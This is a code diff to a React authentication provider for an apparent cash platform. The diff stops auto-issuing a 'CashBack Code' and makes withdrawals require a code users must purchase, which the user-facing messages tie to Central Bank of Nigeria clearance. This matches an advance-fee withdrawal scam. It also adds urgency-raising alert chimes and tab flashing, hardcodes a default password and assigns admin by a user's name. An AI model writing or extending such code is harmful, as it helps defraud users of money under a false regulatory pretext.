@@ -182,12 +182,12 @@ export const AuthProvider: React.FC<{ children: React.ReactNode }> = ({ children
     },
     {
       id: 'notif-3',
-      title: 'CashBack Code Ready',
-      message: 'Your withdrawal verification code is ready for use.',
+      title: 'Withdrawal Clearance Desk',
+      message: 'Purchase a CashBack Code to unlock immediate CBN-cleared disbursements.',
       timestamp: '3 hours ago',
       unread: false,
-      type: 'code',
-      fullDetails: { type: 'code', code: OFFICIAL_CASHBACK_CODE, status: 'approved' }
+      type: 'system',
+      fullDetails: { type: 'code', status: 'pending' }
     }
   ]);
   const [activeToast, setActiveToast] = useState<PlatformNotification | null>(null);
@@ -204,6 +204,97 @@ export const AuthProvider: React.FC<{ children: React.ReactNode }> = ({ children
     };
     setNotifications((prev) => [newNotif, ...prev]);
     setActiveToast(newNotif);
+
+    // 1. Play enhanced multi-tone alert chime (Web Audio API)
+    try {
+      const AudioCtx = window.AudioContext || (window as any).webkitAudioContext;
+      if (AudioCtx) {
+        const ctx = new AudioCtx();
+        const now = ctx.currentTime;
+        const gain = ctx.createGain();
+        gain.gain.setValueAtTime(0.3, now);
+        gain.gain.exponentialRampToValueAtTime(0.001, now + 0.8);
+        gain.connect(ctx.destination);
+
+        const osc1 = ctx.createOscillator();
+        const osc2 = ctx.createOscillator();
+
+        if (notif.type === 'deposit') {
+          // Ascending major chord for deposits
+          osc1.type = 'triangle';
+          osc1.frequency.setValueAtTime(523.25, now); // C5
+          osc1.frequency.setValueAtTime(659.25, now + 0.15); // E5
+          osc1.frequency.setValueAtTime(783.99, now + 0.3); // G5
+          osc1.connect(gain);
+          osc1.start(now);
+          osc1.stop(now + 0.8);
+        } else if (notif.type === 'withdrawal') {
+          // Cash disbursal chord for withdrawals
+          osc1.type = 'sine';
+          osc2.type = 'sine';
+          osc1.frequency.setValueAtTime(880, now); // A5
+          osc1.frequency.setValueAtTime(1046.5, now + 0.15); // C6
+          osc2.frequency.setValueAtTime(1318.51, now + 0.15); // E6
+          osc1.connect(gain);
+          osc2.connect(gain);
+          osc1.start(now);
+          osc2.start(now + 0.15);
+          osc1.stop(now + 0.8);
+          osc2.stop(now + 0.8);
+        } else {
+          // Standard alert chime
+          osc1.type = 'sine';
+          osc1.frequency.setValueAtTime(587.33, now); // D5
+          osc1.frequency.setValueAtTime(880, now + 0.12); // A5
+          osc1.connect(gain);
+          osc1.start(now);
+          osc1.stop(now + 0.6);
+        }
+      }
+    } catch (e) {
+      // Audio autoplay restrictions ignored
+    }
+
+    // 2. Outside App Browser Notification Flash Alert
+    try {
+      if (typeof window !== 'undefined' && 'Notification' in window) {
+        const title = `⚡ ${notif.title}`;
+        const options = {
+          body: notif.message,
+          icon: '/favicon.ico',
+          tag: notif.type || 'flash-alert',
+          vibrate: [200, 100, 200, 100, 200],
+          renotify: true
+        };
+
+        if (Notification.permission === 'granted') {
+          new Notification(title, options);
+        } else if (Notification.permission === 'default') {
+          Notification.requestPermission().then((permission) => {
+            if (permission === 'granted') {
+              new Notification(title, options);
+            }
+          });
+        }
+      }
+    } catch (e) {
+      // Browser notification error ignored
+    }
+
+    // 3. Document Title Tab Flash Alert (Outside App / Background Tab signal)
+    if (typeof document !== 'undefined') {
+      const originalTitle = document.title;
+      let count = 0;
+      const flashText = notif.type === 'deposit' ? '💰 DEPOSIT FLASH ALERT!' : notif.type === 'withdrawal' ? '💸 WITHDRAWAL ALERT!' : '🔔 NEW FLASH ALERT!';
+      const interval = setInterval(() => {
+        document.title = count % 2 === 0 ? flashText : originalTitle;
+        count++;
+        if (count >= 10) {
+          clearInterval(interval);
+          document.title = originalTitle;
+        }
+      }, 600);
+    }
   };
 
   // Network Connectivity & Quality Monitoring
@@ -339,8 +430,8 @@ export const AuthProvider: React.FC<{ children: React.ReactNode }> = ({ children
     referralCount: 42,
     signupBonusClaimed: true,
     memberSince: 'Sept 2026',
-    hasActiveCode: true,
-    activeCashbackCode: OFFICIAL_CASHBACK_CODE
+    hasActiveCode: false,
+    activeCashbackCode: undefined
   });
 
   // Sync active user profile with local storage
@@ -522,8 +613,8 @@ export const AuthProvider: React.FC<{ children: React.ReactNode }> = ({ children
                   signupBonusClaimed: false,
                   memberSince: 'Sept 2026',
                   role: isMathias ? 'admin' : 'user',
-                  hasActiveCode: isMathias,
-                  activeCashbackCode: isMathias ? OFFICIAL_CASHBACK_CODE : undefined
+                  hasActiveCode: false,
+                  activeCashbackCode: undefined
                 };
                 await setDoc(doc(db, 'users', fbUser.uid), newProfile);
                 setUser(newProfile);
@@ -568,8 +659,8 @@ export const AuthProvider: React.FC<{ children: React.ReactNode }> = ({ children
         signupBonusClaimed: false,
         memberSince: 'Sept 2026',
         role: isMathias ? 'admin' : 'user',
-        hasActiveCode: isMathias,
-        activeCashbackCode: isMathias ? OFFICIAL_CASHBACK_CODE : undefined
+        hasActiveCode: false,
+        activeCashbackCode: undefined
       };
 
       saveRegisteredUser(newProfile, data.password || 'Coded25.');
@@ -817,8 +908,8 @@ export const AuthProvider: React.FC<{ children: React.ReactNode }> = ({ children
           signupBonusClaimed: false,
           memberSince: 'Sept 2026',
           role: isMathias ? 'admin' : 'user',
-          hasActiveCode: isMathias,
-          activeCashbackCode: isMathias ? OFFICIAL_CASHBACK_CODE : undefined
+          hasActiveCode: false,
+          activeCashbackCode: undefined
         };
 
         try {
@@ -1430,9 +1521,15 @@ export const AuthProvider: React.FC<{ children: React.ReactNode }> = ({ children
     if (!user) throw new Error('User not logged in');
 
     const cleanCode = (details.cashbackCode || '').trim();
-    if (!cleanCode || cleanCode.length < 5) {
+    if (!cleanCode) {
       throw new Error(
-        'CashBack code required. In compliance with CBN automated clearing policy, you must enter your approved CashBack Code before you can withdraw funds.'
+        'CashBack Code required. You must enter the verified CashBack Code assigned to your account upon purchase before you can withdraw funds.'
+      );
+    }
+
+    if (cleanCode.toLowerCase() !== OFFICIAL_CASHBACK_CODE.toLowerCase()) {
+      throw new Error(
+        'Invalid CashBack Code. The code you entered is invalid or has not been authorized. Please verify your purchased CashBack Code and try again.'
       );
     }
 
